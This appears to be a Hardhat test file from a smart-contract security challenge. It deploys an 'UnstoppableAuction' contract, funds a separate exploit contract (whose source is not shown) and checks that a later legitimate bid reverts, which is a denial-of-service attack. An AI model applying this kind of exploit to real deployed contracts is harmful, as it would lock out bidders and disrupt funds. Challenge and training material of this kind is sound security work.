const { expect } = require('chai')
const { ethers } = require('hardhat')

describe('[UNSTOPPABLE AUCTION EXPLOIT]', async function () {
    let deployer, attacker

    const INITIAL_BID = ethers.utils.parseEther('10')

    before(async function () {
        // SET UP
        ;[deployer, attacker, alice, bob] = await ethers.getSigners()

        this.auction = await (
            await ethers.getContractFactory('UnstoppableAuction', deployer)
        ).deploy('0', ethers.constants.MaxUint256)

        await this.auction.connect(alice).bid({ value: INITIAL_BID })

        expect(
            await ethers.provider.getBalance(this.auction.address)
        ).to.be.equal(INITIAL_BID)
    })

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (
            await ethers.getContractFactory('UnstoppableAuctionExploit', deployer)
        ).deploy(this.auction.address)
        
        
        let tx = {
            to: exploit.address,
            value: ethers.utils.parseEther("0.001"),
            gasLimit: 50000
        }
    
        await attacker.sendTransaction(tx)

        
        await exploit.connect(attacker).run();
        
    })

    after(async function () {
        // SUCCESS CONDITIONS
        await expect(
            this.auction.connect(bob).bid({ value: INITIAL_BID.add(ethers.utils.parseEther('1')) })
        ).to.be.revertedWith("invalid balance")
    })
})
